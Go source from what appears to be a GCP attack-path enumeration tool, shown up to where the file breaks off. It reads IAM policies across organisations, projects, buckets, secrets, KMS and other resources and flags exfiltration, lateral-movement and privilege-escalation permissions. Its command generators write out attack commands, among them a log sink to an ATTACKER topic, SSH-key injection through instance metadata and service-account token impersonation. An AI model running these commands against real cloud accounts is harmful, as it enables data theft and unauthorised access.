			permissions := s.getRolePermissions(iamService, binding.Role, "")
			for _, member := range binding.Members {
				memberPaths := s.analyzePermissionsForAttackPaths(
					member, binding.Role, permissions, "",
					"folder", folderID, folder.DisplayName,
					pathType, exfilPermMap, lateralPermMap, privescPermMap,
				)
				paths = append(paths, memberPaths...)
			}
		}
	}

	return paths, folderNames, nil
}

// AnalyzeProjectAttackPaths analyzes project-level IAM for attack paths
func (s *AttackPathService) AnalyzeProjectAttackPaths(ctx context.Context, projectID, projectName, pathType string) ([]AttackPath, error) {
	var paths []AttackPath

	// Get project IAM policy
	crmService, err := s.getResourceManagerService(ctx)
	if err != nil {
		return nil, gcpinternal.ParseGCPError(err, "cloudresourcemanager.googleapis.com")
	}

	policy, err := crmService.Projects.GetIamPolicy(projectID, &crmv1.GetIamPolicyRequest{}).Do()
	if err != nil {
		return nil, gcpinternal.ParseGCPError(err, "cloudresourcemanager.googleapis.com")
	}

	// Get IAM service for role resolution
	iamService, err := s.getIAMService(ctx)
	if err != nil {
		iamService = nil
	}

	// Get permission maps based on path type
	exfilPermMap, lateralPermMap, privescPermMap := s.getPermissionMaps(pathType)

	// Analyze each binding
	for _, binding := range policy.Bindings {
		if binding == nil {
			continue
		}

		permissions := s.getRolePermissions(iamService, binding.Role, projectID)
		for _, member := range binding.Members {
			memberPaths := s.analyzePermissionsForAttackPaths(
				member, binding.Role, permissions, projectID,
				"project", projectID, projectName,
				pathType, exfilPermMap, lateralPermMap, privescPermMap,
			)
			paths = append(paths, memberPaths...)
		}
	}

	return paths, nil
}

// AnalyzeResourceAttackPaths analyzes resource-level IAM for attack paths
func (s *AttackPathService) AnalyzeResourceAttackPaths(ctx context.Context, projectID, pathType string) ([]AttackPath, error) {
	var paths []AttackPath

	// Get permission maps based on path type
	exfilPermMap, lateralPermMap, privescPermMap := s.getPermissionMaps(pathType)

	// Get IAM service for role resolution
	iamService, err := s.getIAMService(ctx)
	if err != nil {
		iamService = nil
	}

	// Analyze GCS bucket IAM policies
	bucketPaths := s.analyzeBucketIAM(ctx, projectID, pathType, exfilPermMap, lateralPermMap, privescPermMap, iamService)
	paths = append(paths, bucketPaths...)

	// Analyze BigQuery dataset IAM policies
	bqPaths := s.analyzeBigQueryIAM(ctx, projectID, pathType, exfilPermMap, lateralPermMap, privescPermMap, iamService)
	paths = append(paths, bqPaths...)

	// Analyze Service Account IAM policies
	saPaths := s.analyzeServiceAccountIAM(ctx, projectID, pathType, exfilPermMap, lateralPermMap, privescPermMap, iamService)
	paths = append(paths, saPaths...)

	// Analyze Compute resource IAM (images, snapshots)
	computePaths := s.analyzeComputeResourceIAM(ctx, projectID, pathType, exfilPermMap, lateralPermMap, privescPermMap, iamService)
	paths = append(paths, computePaths...)

	// Analyze Secret Manager IAM policies
	secretPaths := s.analyzeSecretManagerIAM(ctx, projectID, pathType, exfilPermMap, lateralPermMap, privescPermMap, iamService)
	paths = append(paths, secretPaths...)

	// Analyze Cloud Functions IAM policies
	functionPaths := s.analyzeCloudFunctionsIAM(ctx, projectID, pathType, exfilPermMap, lateralPermMap, privescPermMap, iamService)
	paths = append(paths, functionPaths...)

	// Analyze Cloud Run IAM policies
	cloudRunPaths := s.analyzeCloudRunIAM(ctx, projectID, pathType, exfilPermMap, lateralPermMap, privescPermMap, iamService)
	paths = append(paths, cloudRunPaths...)

	// Analyze KMS IAM policies
	kmsPaths := s.analyzeKMSIAM(ctx, projectID, pathType, exfilPermMap, lateralPermMap, privescPermMap, iamService)
	paths = append(paths, kmsPaths...)

	// Analyze Pub/Sub IAM policies
	pubsubPaths := s.analyzePubSubIAM(ctx, projectID, pathType, exfilPermMap, lateralPermMap, privescPermMap, iamService)
	paths = append(paths, pubsubPaths...)

	// Analyze Spanner IAM policies
	spannerPaths := s.analyzeSpannerIAM(ctx, projectID, pathType, exfilPermMap, lateralPermMap, privescPermMap, iamService)
	paths = append(paths, spannerPaths...)

	// Analyze Compute Instance IAM policies
	instancePaths := s.analyzeComputeInstanceIAM(ctx, projectID, pathType, exfilPermMap, lateralPermMap, privescPermMap, iamService)
	paths = append(paths, instancePaths...)

	return paths, nil
}

// analyzeBucketIAM analyzes IAM policies on GCS buckets
func (s *AttackPathService) analyzeBucketIAM(ctx context.Context, projectID, pathType string, exfilPermMap map[string]DataExfilPermission, lateralPermMap map[string]LateralMovementPermission, privescPermMap map[string]PrivescPermission, iamService *iam.Service) []AttackPath {
	var paths []AttackPath

	storageService, err := s.getStorageService(ctx)
	if err != nil {
		return paths
	}

	// List buckets in the project
	buckets, err := storageService.Buckets.List(projectID).Do()
	if err != nil {
		return paths
	}

	for _, bucket := range buckets.Items {
		// Get IAM policy for this bucket
		policy, err := storageService.Buckets.GetIamPolicy(bucket.Name).Do()
		if err != nil {
			continue
		}

		for _, binding := range policy.Bindings {
			permissions := s.getRolePermissions(iamService, binding.Role, projectID)
			for _, member := range binding.Members {
				memberPaths := s.analyzePermissionsForAttackPaths(
					member, binding.Role, permissions, projectID,
					"resource", fmt.Sprintf("gs://%s", bucket.Name), bucket.Name,
					pathType, exfilPermMap, lateralPermMap, privescPermMap,
				)
				paths = append(paths, memberPaths...)
			}
		}
	}

	return paths
}

// analyzeBigQueryIAM analyzes IAM policies on BigQuery datasets
func (s *AttackPathService) analyzeBigQueryIAM(ctx context.Context, projectID, pathType string, exfilPermMap map[string]DataExfilPermission, lateralPermMap map[string]LateralMovementPermission, privescPermMap map[string]PrivescPermission, iamService *iam.Service) []AttackPath {
	var paths []AttackPath

	bqService, err := s.getBigQueryService(ctx)
	if err != nil {
		return paths
	}

	// List datasets in the project
	datasets, err := bqService.Datasets.List(projectID).Do()
	if err != nil {
		return paths
	}

	for _, dataset := range datasets.Datasets {
		datasetID := dataset.DatasetReference.DatasetId

		// Get dataset to access IAM policy
		ds, err := bqService.Datasets.Get(projectID, datasetID).Do()
		if err != nil {
			continue
		}

		// BigQuery uses Access entries instead of standard IAM bindings
		for _, access := range ds.Access {
			member := ""
			if access.UserByEmail != "" {
				member = "user:" + access.UserByEmail
			} else if access.GroupByEmail != "" {
				member = "group:" + access.GroupByEmail
			} else if access.SpecialGroup != "" {
				member = access.SpecialGroup
			} else if access.IamMember != "" {
				member = access.IamMember
			}

			if member == "" {
				continue
			}

			role := access.Role
			permissions := s.getRolePermissions(iamService, "roles/bigquery."+strings.ToLower(role), projectID)

			memberPaths := s.analyzePermissionsForAttackPaths(
				member, role, permissions, projectID,
				"resource", fmt.Sprintf("%s:%s", projectID, datasetID), datasetID,
				pathType, exfilPermMap, lateralPermMap, privescPermMap,
			)
			paths = append(paths, memberPaths...)
		}
	}

	return paths
}

// analyzeServiceAccountIAM analyzes IAM policies on service accounts
func (s *AttackPathService) analyzeServiceAccountIAM(ctx context.Context, projectID, pathType string, exfilPermMap map[string]DataExfilPermission, lateralPermMap map[string]LateralMovementPermission, privescPermMap map[string]PrivescPermission, iamService *iam.Service) []AttackPath {
	var paths []AttackPath

	if iamService == nil {
		var err error
		iamService, err = s.getIAMService(ctx)
		if err != nil {
			return paths
		}
	}

	// List service accounts in the project
	saList, err := iamService.Projects.ServiceAccounts.List("projects/" + projectID).Do()
	if err != nil {
		return paths
	}

	for _, sa := range saList.Accounts {
		// Get IAM policy for this service account
		policy, err := iamService.Projects.ServiceAccounts.GetIamPolicy("projects/" + projectID + "/serviceAccounts/" + sa.Email).Do()
		if err != nil {
			continue
		}

		for _, binding := range policy.Bindings {
			permissions := s.getRolePermissions(iamService, binding.Role, projectID)
			for _, member := range binding.Members {
				memberPaths := s.analyzePermissionsForAttackPaths(
					member, binding.Role, permissions, projectID,
					"resource", sa.Email, sa.DisplayName,
					pathType, exfilPermMap, lateralPermMap, privescPermMap,
				)
				paths = append(paths, memberPaths...)
			}
		}
	}

	return paths
}

// analyzeComputeResourceIAM analyzes IAM policies on compute resources (images, snapshots)
func (s *AttackPathService) analyzeComputeResourceIAM(ctx context.Context, projectID, pathType string, exfilPermMap map[string]DataExfilPermission, lateralPermMap map[string]LateralMovementPermission, privescPermMap map[string]PrivescPermission, iamService *iam.Service) []AttackPath {
	var paths []AttackPath

	computeService, err := s.getComputeService(ctx)
	if err != nil {
		return paths
	}

	// Analyze images
	images, err := computeService.Images.List(projectID).Do()
	if err == nil {
		for _, image := range images.Items {
			policy, err := computeService.Images.GetIamPolicy(projectID, image.Name).Do()
			if err != nil {
				continue
			}

			for _, binding := range policy.Bindings {
				permissions := s.getRolePermissions(iamService, binding.Role, projectID)
				for _, member := range binding.Members {
					memberPaths := s.analyzePermissionsForAttackPaths(
						member, binding.Role, permissions, projectID,
						"resource", fmt.Sprintf("image/%s", image.Name), image.Name,
						pathType, exfilPermMap, lateralPermMap, privescPermMap,
					)
					paths = append(paths, memberPaths...)
				}
			}
		}
	}

	// Analyze snapshots
	snapshots, err := computeService.Snapshots.List(projectID).Do()
	if err == nil {
		for _, snapshot := range snapshots.Items {
			policy, err := computeService.Snapshots.GetIamPolicy(projectID, snapshot.Name).Do()
			if err != nil {
				continue
			}

			for _, binding := range policy.Bindings {
				permissions := s.getRolePermissions(iamService, binding.Role, projectID)
				for _, member := range binding.Members {
					memberPaths := s.analyzePermissionsForAttackPaths(
						member, binding.Role, permissions, projectID,
						"resource", fmt.Sprintf("snapshot/%s", snapshot.Name), snapshot.Name,
						pathType, exfilPermMap, lateralPermMap, privescPermMap,
					)
					paths = append(paths, memberPaths...)
				}
			}
		}
	}

	return paths
}

// analyzeSecretManagerIAM analyzes IAM policies on Secret Manager secrets
func (s *AttackPathService) analyzeSecretManagerIAM(ctx context.Context, projectID, pathType string, exfilPermMap map[string]DataExfilPermission, lateralPermMap map[string]LateralMovementPermission, privescPermMap map[string]PrivescPermission, iamService *iam.Service) []AttackPath {
	var paths []AttackPath

	smService, err := s.getSecretManagerService(ctx)
	if err != nil {
		return paths
	}

	// List secrets in the project
	parent := fmt.Sprintf("projects/%s", projectID)
	secrets, err := smService.Projects.Secrets.List(parent).Do()
	if err != nil {
		return paths
	}

	for _, secret := range secrets.Secrets {
		// Get IAM policy for this secret
		policy, err := smService.Projects.Secrets.GetIamPolicy(secret.Name).Do()
		if err != nil {
			continue
		}

		secretName := secret.Name
		// Extract just the secret name from the full path
		parts := strings.Split(secret.Name, "/")
		if len(parts) > 0 {
			secretName = parts[len(parts)-1]
		}

		for _, binding := range policy.Bindings {
			permissions := s.getRolePermissions(iamService, binding.Role, projectID)
			for _, member := range binding.Members {
				memberPaths := s.analyzePermissionsForAttackPaths(
					member, binding.Role, permissions, projectID,
					"resource", fmt.Sprintf("secret/%s", secretName), secretName,
					pathType, exfilPermMap, lateralPermMap, privescPermMap,
				)
				paths = append(paths, memberPaths...)
			}
		}
	}

	return paths
}

// analyzeCloudFunctionsIAM analyzes IAM policies on Cloud Functions
func (s *AttackPathService) analyzeCloudFunctionsIAM(ctx context.Context, projectID, pathType string, exfilPermMap map[string]DataExfilPermission, lateralPermMap map[string]LateralMovementPermission, privescPermMap map[string]PrivescPermission, iamService *iam.Service) []AttackPath {
	var paths []AttackPath

	cfService, err := s.getCloudFunctionsService(ctx)
	if err != nil {
		return paths
	}

	// List functions in the project (all locations)
	parent := fmt.Sprintf("projects/%s/locations/-", projectID)
	functions, err := cfService.Projects.Locations.Functions.List(parent).Do()
	if err != nil {
		return paths
	}

	for _, fn := range functions.Functions {
		// Get IAM policy for this function
		policy, err := cfService.Projects.Locations.Functions.GetIamPolicy(fn.Name).Do()
		if err != nil {
			continue
		}

		fnName := fn.Name
		// Extract just the function name from the full path
		parts := strings.Split(fn.Name, "/")
		if len(parts) > 0 {
			fnName = parts[len(parts)-1]
		}

		for _, binding := range policy.Bindings {
			permissions := s.getRolePermissions(iamService, binding.Role, projectID)
			for _, member := range binding.Members {
				memberPaths := s.analyzePermissionsForAttackPaths(
					member, binding.Role, permissions, projectID,
					"resource", fmt.Sprintf("function/%s", fnName), fnName,
					pathType, exfilPermMap, lateralPermMap, privescPermMap,
				)
				paths = append(paths, memberPaths...)
			}
		}
	}

	return paths
}

// analyzeCloudRunIAM analyzes IAM policies on Cloud Run services
func (s *AttackPathService) analyzeCloudRunIAM(ctx context.Context, projectID, pathType string, exfilPermMap map[string]DataExfilPermission, lateralPermMap map[string]LateralMovementPermission, privescPermMap map[string]PrivescPermission, iamService *iam.Service) []AttackPath {
	var paths []AttackPath

	runService, err := s.getCloudRunService(ctx)
	if err != nil {
		return paths
	}

	// List services in the project (all locations)
	parent := fmt.Sprintf("projects/%s/locations/-", projectID)
	services, err := runService.Projects.Locations.Services.List(parent).Do()
	if err == nil {
		for _, svc := range services.Items {
			// Get IAM policy for this service
			policy, err := runService.Projects.Locations.Services.GetIamPolicy(svc.Metadata.Name).Do()
			if err != nil {
				continue
			}

			svcName := svc.Metadata.Name
			// Extract just the service name from the full path
			parts := strings.Split(svc.Metadata.Name, "/")
			if len(parts) > 0 {
				svcName = parts[len(parts)-1]
			}

			for _, binding := range policy.Bindings {
				permissions := s.getRolePermissions(iamService, binding.Role, projectID)
				for _, member := range binding.Members {
					memberPaths := s.analyzePermissionsForAttackPaths(
						member, binding.Role, permissions, projectID,
						"resource", fmt.Sprintf("run-service/%s", svcName), svcName,
						pathType, exfilPermMap, lateralPermMap, privescPermMap,
					)
					paths = append(paths, memberPaths...)
				}
			}
		}
	}

	return paths
}

// analyzeKMSIAM analyzes IAM policies on KMS keys
func (s *AttackPathService) analyzeKMSIAM(ctx context.Context, projectID, pathType string, exfilPermMap map[string]DataExfilPermission, lateralPermMap map[string]LateralMovementPermission, privescPermMap map[string]PrivescPermission, iamService *iam.Service) []AttackPath {
	var paths []AttackPath

	kmsService, err := s.getKMSService(ctx)
	if err != nil {
		return paths
	}

	// List key rings in the project (all locations)
	parent := fmt.Sprintf("projects/%s/locations/-", projectID)
	keyRings, err := kmsService.Projects.Locations.KeyRings.List(parent).Do()
	if err != nil {
		return paths
	}

	for _, keyRing := range keyRings.KeyRings {
		// List crypto keys in this key ring
		keys, err := kmsService.Projects.Locations.KeyRings.CryptoKeys.List(keyRing.Name).Do()
		if err != nil {
			continue
		}

		for _, key := range keys.CryptoKeys {
			// Get IAM policy for this key
			policy, err := kmsService.Projects.Locations.KeyRings.CryptoKeys.GetIamPolicy(key.Name).Do()
			if err != nil {
				continue
			}

			keyName := key.Name
			// Extract just the key name from the full path
			parts := strings.Split(key.Name, "/")
			if len(parts) > 0 {
				keyName = parts[len(parts)-1]
			}

			for _, binding := range policy.Bindings {
				permissions := s.getRolePermissions(iamService, binding.Role, projectID)
				for _, member := range binding.Members {
					memberPaths := s.analyzePermissionsForAttackPaths(
						member, binding.Role, permissions, projectID,
						"resource", fmt.Sprintf("kms-key/%s", keyName), keyName,
						pathType, exfilPermMap, lateralPermMap, privescPermMap,
					)
					paths = append(paths, memberPaths...)
				}
			}
		}
	}

	return paths
}

// analyzePubSubIAM analyzes IAM policies on Pub/Sub topics and subscriptions
func (s *AttackPathService) analyzePubSubIAM(ctx context.Context, projectID, pathType string, exfilPermMap map[string]DataExfilPermission, lateralPermMap map[string]LateralMovementPermission, privescPermMap map[string]PrivescPermission, iamService *iam.Service) []AttackPath {
	var paths []AttackPath

	pubsubService, err := s.getPubSubService(ctx)
	if err != nil {
		return paths
	}

	// List topics in the project
	project := fmt.Sprintf("projects/%s", projectID)
	topics, err := pubsubService.Projects.Topics.List(project).Do()
	if err == nil {
		for _, topic := range topics.Topics {
			// Get IAM policy for this topic
			policy, err := pubsubService.Projects.Topics.GetIamPolicy(topic.Name).Do()
			if err != nil {
				continue
			}

			topicName := topic.Name
			// Extract just the topic name from the full path
			parts := strings.Split(topic.Name, "/")
			if len(parts) > 0 {
				topicName = parts[len(parts)-1]
			}

			for _, binding := range policy.Bindings {
				permissions := s.getRolePermissions(iamService, binding.Role, projectID)
				for _, member := range binding.Members {
					memberPaths := s.analyzePermissionsForAttackPaths(
						member, binding.Role, permissions, projectID,
						"resource", fmt.Sprintf("topic/%s", topicName), topicName,
						pathType, exfilPermMap, lateralPermMap, privescPermMap,
					)
					paths = append(paths, memberPaths...)
				}
			}
		}
	}

	// List subscriptions in the project
	subscriptions, err := pubsubService.Projects.Subscriptions.List(project).Do()
	if err == nil {
		for _, sub := range subscriptions.Subscriptions {
			// Get IAM policy for this subscription
			policy, err := pubsubService.Projects.Subscriptions.GetIamPolicy(sub.Name).Do()
			if err != nil {
				continue
			}

			subName := sub.Name
			// Extract just the subscription name from the full path
			parts := strings.Split(sub.Name, "/")
			if len(parts) > 0 {
				subName = parts[len(parts)-1]
			}

			for _, binding := range policy.Bindings {
				permissions := s.getRolePermissions(iamService, binding.Role, projectID)
				for _, member := range binding.Members {
					memberPaths := s.analyzePermissionsForAttackPaths(
						member, binding.Role, permissions, projectID,
						"resource", fmt.Sprintf("subscription/%s", subName), subName,
						pathType, exfilPermMap, lateralPermMap, privescPermMap,
					)
					paths = append(paths, memberPaths...)
				}
			}
		}
	}

	return paths
}

// analyzeSpannerIAM analyzes IAM policies on Spanner instances and databases
func (s *AttackPathService) analyzeSpannerIAM(ctx context.Context, projectID, pathType string, exfilPermMap map[string]DataExfilPermission, lateralPermMap map[string]LateralMovementPermission, privescPermMap map[string]PrivescPermission, iamService *iam.Service) []AttackPath {
	var paths []AttackPath

	spannerService, err := s.getSpannerService(ctx)
	if err != nil {
		return paths
	}

	// List instances in the project
	parent := fmt.Sprintf("projects/%s", projectID)
	instances, err := spannerService.Projects.Instances.List(parent).Do()
	if err != nil {
		return paths
	}

	for _, instance := range instances.Instances {
		// Get IAM policy for this instance
		policy, err := spannerService.Projects.Instances.GetIamPolicy(instance.Name, &spanner.GetIamPolicyRequest{}).Do()
		if err == nil {
			instanceName := instance.Name
			// Extract just the instance name from the full path
			parts := strings.Split(instance.Name, "/")
			if len(parts) > 0 {
				instanceName = parts[len(parts)-1]
			}

			for _, binding := range policy.Bindings {
				permissions := s.getRolePermissions(iamService, binding.Role, projectID)
				for _, member := range binding.Members {
					memberPaths := s.analyzePermissionsForAttackPaths(
						member, binding.Role, permissions, projectID,
						"resource", fmt.Sprintf("spanner-instance/%s", instanceName), instanceName,
						pathType, exfilPermMap, lateralPermMap, privescPermMap,
					)
					paths = append(paths, memberPaths...)
				}
			}
		}

		// List databases in this instance
		databases, err := spannerService.Projects.Instances.Databases.List(instance.Name).Do()
		if err != nil {
			continue
		}

		for _, db := range databases.Databases {
			// Get IAM policy for this database
			policy, err := spannerService.Projects.Instances.Databases.GetIamPolicy(db.Name, &spanner.GetIamPolicyRequest{}).Do()
			if err != nil {
				continue
			}

			dbName := db.Name
			// Extract just the database name from the full path
			parts := strings.Split(db.Name, "/")
			if len(parts) > 0 {
				dbName = parts[len(parts)-1]
			}

			for _, binding := range policy.Bindings {
				permissions := s.getRolePermissions(iamService, binding.Role, projectID)
				for _, member := range binding.Members {
					memberPaths := s.analyzePermissionsForAttackPaths(
						member, binding.Role, permissions, projectID,
						"resource", fmt.Sprintf("spanner-db/%s", dbName), dbName,
						pathType, exfilPermMap, lateralPermMap, privescPermMap,
					)
					paths = append(paths, memberPaths...)
				}
			}
		}
	}

	return paths
}

// analyzeComputeInstanceIAM analyzes IAM policies on Compute instances
func (s *AttackPathService) analyzeComputeInstanceIAM(ctx context.Context, projectID, pathType string, exfilPermMap map[string]DataExfilPermission, lateralPermMap map[string]LateralMovementPermission, privescPermMap map[string]PrivescPermission, iamService *iam.Service) []AttackPath {
	var paths []AttackPath

	computeService, err := s.getComputeService(ctx)
	if err != nil {
		return paths
	}

	// List all instances across all zones
	instances, err := computeService.Instances.AggregatedList(projectID).Do()
	if err != nil {
		return paths
	}

	for zonePath, instanceList := range instances.Items {
		if instanceList.Instances == nil {
			continue
		}

		// Extract zone name from path (e.g., "zones/us-central1-a" -> "us-central1-a")
		zone := zonePath
		if strings.HasPrefix(zonePath, "zones/") {
			zone = strings.TrimPrefix(zonePath, "zones/")
		}

		for _, instance := range instanceList.Instances {
			// Get IAM policy for this instance
			policy, err := computeService.Instances.GetIamPolicy(projectID, zone, instance.Name).Do()
			if err != nil {
				continue
			}

			for _, binding := range policy.Bindings {
				permissions := s.getRolePermissions(iamService, binding.Role, projectID)
				for _, member := range binding.Members {
					memberPaths := s.analyzePermissionsForAttackPaths(
						member, binding.Role, permissions, projectID,
						"resource", fmt.Sprintf("instance/%s", instance.Name), instance.Name,
						pathType, exfilPermMap, lateralPermMap, privescPermMap,
					)
					paths = append(paths, memberPaths...)
				}
			}
		}
	}

	return paths
}

// CombinedAttackPathAnalysis performs attack path analysis across all scopes
func (s *AttackPathService) CombinedAttackPathAnalysis(ctx context.Context, projectIDs []string, projectNames map[string]string, pathType string) (*CombinedAttackPathData, error) {
	result := &CombinedAttackPathData{
		OrgPaths:      []AttackPath{},
		FolderPaths:   []AttackPath{},
		ProjectPaths:  []AttackPath{},
		ResourcePaths: []AttackPath{},
		AllPaths:      []AttackPath{},
		OrgNames:      make(map[string]string),
		FolderNames:   make(map[string]string),
		OrgIDs:        []string{},
	}

	// Analyze organization-level IAM
	orgPaths, orgNames, orgIDs, err := s.AnalyzeOrganizationAttackPaths(ctx, pathType)
	if err != nil {
		gcpinternal.HandleGCPError(err, logger, globals.GCP_DATAEXFILTRATION_MODULE_NAME, "Could not analyze organization attack paths")
	} else {
		result.OrgPaths = orgPaths
		result.OrgNames = orgNames
		result.OrgIDs = orgIDs
		result.AllPaths = append(result.AllPaths, orgPaths...)
	}

	// Analyze folder-level IAM
	folderPaths, folderNames, err := s.AnalyzeFolderAttackPaths(ctx, pathType)
	if err != nil {
		gcpinternal.HandleGCPError(err, logger, globals.GCP_DATAEXFILTRATION_MODULE_NAME, "Could not analyze folder attack paths")
	} else {
		result.FolderPaths = folderPaths
		result.FolderNames = folderNames
		result.AllPaths = append(result.AllPaths, folderPaths...)
	}

	// Analyze project-level IAM and resource-level IAM for each project
	for _, projectID := range projectIDs {
		projectName := projectID
		if name, ok := projectNames[projectID]; ok {
			projectName = name
		}

		// Project-level
		projectPathsList, err := s.AnalyzeProjectAttackPaths(ctx, projectID, projectName, pathType)
		if err != nil {
			gcpinternal.HandleGCPError(err, logger, globals.GCP_DATAEXFILTRATION_MODULE_NAME,
				fmt.Sprintf("Could not analyze attack paths for project %s", projectID))
			continue
		}
		result.ProjectPaths = append(result.ProjectPaths, projectPathsList...)
		result.AllPaths = append(result.AllPaths, projectPathsList...)

		// Resource-level
		resourcePaths, err := s.AnalyzeResourceAttackPaths(ctx, projectID, pathType)
		if err != nil {
			gcpinternal.HandleGCPError(err, logger, globals.GCP_DATAEXFILTRATION_MODULE_NAME,
				fmt.Sprintf("Could not analyze resource attack paths for project %s", projectID))
			continue
		}
		result.ResourcePaths = append(result.ResourcePaths, resourcePaths...)
		result.AllPaths = append(result.AllPaths, resourcePaths...)
	}

	return result, nil
}

// Helper functions

func (s *AttackPathService) getPermissionMaps(pathType string) (map[string]DataExfilPermission, map[string]LateralMovementPermission, map[string]PrivescPermission) {
	exfilPermMap := make(map[string]DataExfilPermission)
	lateralPermMap := make(map[string]LateralMovementPermission)
	privescPermMap := make(map[string]PrivescPermission)

	if pathType == "exfil" || pathType == "all" {
		for _, p := range GetDataExfilPermissions() {
			exfilPermMap[p.Permission] = p
		}
	}

	if pathType == "lateral" || pathType == "all" {
		for _, p := range GetLateralMovementPermissions() {
			lateralPermMap[p.Permission] = p
		}
	}

	if pathType == "privesc" || pathType == "all" {
		for _, p := range GetPrivescPermissions() {
			privescPermMap[p.Permission] = p
		}
	}

	return exfilPermMap, lateralPermMap, privescPermMap
}

func (s *AttackPathService) getRolePermissions(iamService *iam.Service, role string, projectID string) []string {
	if iamService == nil {
		return []string{}
	}

	ctx := context.Background()
	var roleInfo *iam.Role
	var err error

	if strings.HasPrefix(role, "roles/") {
		roleInfo, err = iamService.Roles.Get(role).Do()
	} else if strings.HasPrefix(role, "projects/") {
		roleInfo, err = iamService.Projects.Roles.Get(role).Do()
	} else if strings.HasPrefix(role, "organizations/") {
		roleInfo, err = iamService.Organizations.Roles.Get(role).Do()
	} else {
		roleInfo, err = iamService.Roles.Get("roles/" + role).Do()
	}

	if err != nil {
		return s.getTestablePermissions(ctx, iamService, role, projectID)
	}

	return roleInfo.IncludedPermissions
}

func (s *AttackPathService) getTestablePermissions(ctx context.Context, iamService *iam.Service, role string, projectID string) []string {
	// Return known permissions for common roles
	knownRoles := map[string][]string{
		"roles/owner": {
			"storage.objects.get", "storage.objects.list", "bigquery.tables.getData",
			"compute.images.create", "compute.snapshots.create", "logging.sinks.create",
			"compute.networks.addPeering", "compute.instances.setMetadata",
		},
		"roles/editor": {
			"storage.objects.get", "storage.objects.list", "bigquery.tables.getData",
			"compute.images.create", "compute.snapshots.create",
			"compute.instances.setMetadata",
		},
		"roles/storage.objectViewer": {
			"storage.objects.get", "storage.objects.list",
		},
		"roles/bigquery.dataViewer": {
			"bigquery.tables.getData",
		},
	}

	if perms, ok := knownRoles[role]; ok {
		return perms
	}
	return []string{}
}

func (s *AttackPathService) analyzePermissionsForAttackPaths(
	member, role string, permissions []string, projectID,
	scopeType, scopeID, scopeName, pathType string,
	exfilPermMap map[string]DataExfilPermission,
	lateralPermMap map[string]LateralMovementPermission,
	privescPermMap map[string]PrivescPermission,
) []AttackPath {
	var paths []AttackPath

	// Skip allUsers/allAuthenticatedUsers for permission-based analysis
	if member == "allUsers" || member == "allAuthenticatedUsers" {
		return paths
	}

	principalType := extractPrincipalType(member)
	principal := extractPrincipalEmail(member)

	// Check for exfil permissions
	for _, perm := range permissions {
		if exfilPerm, ok := exfilPermMap[perm]; ok {
			path := AttackPath{
				Principal:      principal,
				PrincipalType:  principalType,
				Method:         perm,
				TargetResource: scopeName,
				Permissions:    []string{perm},
				Category:       exfilPerm.Category,
				RiskLevel:      exfilPerm.RiskLevel,
				Description:    exfilPerm.Description,
				ExploitCommand: GenerateExfilCommand(perm, projectID, scopeID),
				ProjectID:      projectID,
				ScopeType:      scopeType,
				ScopeID:        scopeID,
				ScopeName:      scopeName,
				PathType:       "exfil",
			}
			paths = append(paths, path)
		}
	}

	// Check for lateral movement permissions
	for _, perm := range permissions {
		if lateralPerm, ok := lateralPermMap[perm]; ok {
			path := AttackPath{
				Principal:      principal,
				PrincipalType:  principalType,
				Method:         perm,
				TargetResource: scopeName,
				Permissions:    []string{perm},
				Category:       lateralPerm.Category,
				RiskLevel:      lateralPerm.RiskLevel,
				Description:    lateralPerm.Description,
				ExploitCommand: GenerateLateralCommand(perm, projectID, scopeID),
				ProjectID:      projectID,
				ScopeType:      scopeType,
				ScopeID:        scopeID,
				ScopeName:      scopeName,
				PathType:       "lateral",
			}
			paths = append(paths, path)
		}
	}

	// Check for privesc permissions
	for _, perm := range permissions {
		if privescPerm, ok := privescPermMap[perm]; ok {
			path := AttackPath{
				Principal:      principal,
				PrincipalType:  principalType,
				Method:         perm,
				TargetResource: scopeName,
				Permissions:    []string{perm},
				Category:       privescPerm.Category,
				RiskLevel:      privescPerm.RiskLevel,
				Description:    privescPerm.Description,
				ExploitCommand: GeneratePrivescCommand(perm, projectID, scopeID),
				ProjectID:      projectID,
				ScopeType:      scopeType,
				ScopeID:        scopeID,
				ScopeName:      scopeName,
				PathType:       "privesc",
			}
			paths = append(paths, path)
		}
	}

	return paths
}

func extractPrincipalType(member string) string {
	if strings.HasPrefix(member, "user:") {
		return "user"
	} else if strings.HasPrefix(member, "serviceAccount:") {
		return "serviceAccount"
	} else if strings.HasPrefix(member, "group:") {
		return "group"
	} else if strings.HasPrefix(member, "domain:") {
		return "domain"
	}
	return "unknown"
}

func extractPrincipalEmail(member string) string {
	parts := strings.SplitN(member, ":", 2)
	if len(parts) == 2 {
		return parts[1]
	}
	return member
}

// GenerateExfilCommand generates an exploit command for a data exfiltration permission
func GenerateExfilCommand(permission, projectID, scopeID string) string {
	switch permission {
	case "compute.images.create":
		return fmt.Sprintf("gcloud compute images create exfil-image --source-disk=DISK --source-disk-zone=ZONE --project=%s", projectID)
	case "compute.snapshots.create":
		return fmt.Sprintf("gcloud compute snapshots create exfil-snap --source-disk=DISK --source-disk-zone=ZONE --project=%s", projectID)
	case "logging.sinks.create":
		return fmt.Sprintf("gcloud logging sinks create exfil-sink pubsub.googleapis.com/projects/ATTACKER/topics/logs --project=%s", projectID)
	case "storage.objects.get":
		return fmt.Sprintf("gsutil cp gs://%s/OBJECT ./local --project=%s", scopeID, projectID)
	case "bigquery.tables.getData":
		return fmt.Sprintf("bq query --use_legacy_sql=false 'SELECT * FROM `%s.TABLE`'", scopeID)
	case "secretmanager.versions.access":
		return fmt.Sprintf("gcloud secrets versions access latest --secret=SECRET --project=%s", projectID)
	default:
		return fmt.Sprintf("# %s - refer to GCP documentation", permission)
	}
}

// GenerateLateralCommand generates an exploit command for a lateral movement permission
func GenerateLateralCommand(permission, projectID, scopeID string) string {
	switch permission {
	case "compute.networks.addPeering":
		return fmt.Sprintf("gcloud compute networks peerings create peering --network=NET --peer-network=projects/TARGET/global/networks/NET --project=%s", projectID)
	case "compute.instances.osLogin":
		return fmt.Sprintf("gcloud compute ssh INSTANCE --zone=ZONE --project=%s", projectID)
	case "compute.instances.setMetadata":
		return fmt.Sprintf("gcloud compute instances add-metadata INSTANCE --zone=ZONE --metadata=ssh-keys=\"user:$(cat ~/.ssh/id_rsa.pub)\" --project=%s", projectID)
	case "iam.serviceAccounts.getAccessToken":
		return fmt.Sprintf("gcloud auth print-access-token --impersonate-service-account=%s", scopeID)
	case "container.clusters.getCredentials":
		return fmt.Sprintf("gcloud container clusters get-credentials CLUSTER --zone=ZONE --project=%s", projectID)
	default:
		return fmt.Sprintf("# %s - refer to GCP documentation", permission)
	}
}

// GeneratePrivescCommand generates an exploit command for a privilege escalation permission
